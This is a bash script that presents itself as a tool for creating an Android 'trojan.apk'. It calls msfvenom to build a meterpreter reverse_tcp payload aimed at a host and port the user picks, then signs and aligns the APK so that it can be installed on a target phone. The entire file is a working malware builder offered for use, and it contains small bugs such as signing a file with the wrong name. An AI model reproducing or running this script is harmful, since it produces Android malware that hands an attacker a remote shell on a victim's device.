#start bash code.
#print logo.
clear
echo -e """
 ____                   _        ____            
|  _ \ _   _ _ __ _ __ | | ___  |  _ \  _____   __
| |_) | | | | '__| '_ \| |/ _ \ | | | |/ _ \ \ / /
|  __/| |_| | |  | |_) | |  __/ | |_| |  __/\ V / 
|_|    \__,_|_|  | .__/|_|\___| |____/ \___| \_/  """
echo ""
#advertisment.

echo -e "This tool simplify the cration of a trojan.apk file"
echo -e "\e[0;31m Apk file is for android <10 so when you try to install it it could be have some problem on android 10/11/12\e[0;0m"
echo ""
sleep 1
#check metasploit.
if ! command -v msfvenom  &> /dev/null
then
    echo "Metasploit Framework is not installed!"

 read -r -p "Would you like to install it? [y/N] " response
 case "$response" in
   [yY][eE][sS]|[yY]) 
        do_something
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
#you can also find full installation guide on https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers.
    
        do_something_else
        ;;
esac


    exit
fi

echo "choose a host ip:"
read host
echo "choose a port: [4444 recommended]"
read port
echo "choose a name for your apk"
read name
mkdir -p Trojan/
cd Trojan/

msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk

#keytool check time.
if ! command -v keytool -h  &> /dev/null
then
    echo "Keytool is not installed!"
    echo "You need to install openjdk-8-jre, check installation guide for your distro"
fi
echo "choose an alias for your key:"
read alias
keytool -genkey -V -keystore key.keystore -alias $alias -keyalg RSA -keysize 2048 -validity 10000

#this should be ok.
echo "Signing your apk..."
sleep 1
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android_shell.apk $alias

#if you didn't do it before you need to install zipalign or skip this part and do it with another software.

if ! command -v zipalign -h  &> /dev/null
then
    echo "You need to install zipalign"
    sleep 3
fi
sudo apt-get install zipalign

zipalign -v 4 $name.apk singed_jar.apk
clear

_done_="
    _    ____  _  __   ____                _           _ 
   / \  |  _ \| |/ /  / ___|_ __ ___  __ _| |_ ___  __| |
  / _ \ | |_) |   /  | |   |  __/ _ \/ _  | __/ _ \/ _  |
 / ___ \|  __/|   \  | |___| | |  __/ (_| | ||  __/ (_| |
/_/   \_\_|   |_|\_\  \____|_|  \___|\__,_|\__\___|\__,_|
"
echo "$_done_"


#apk created.
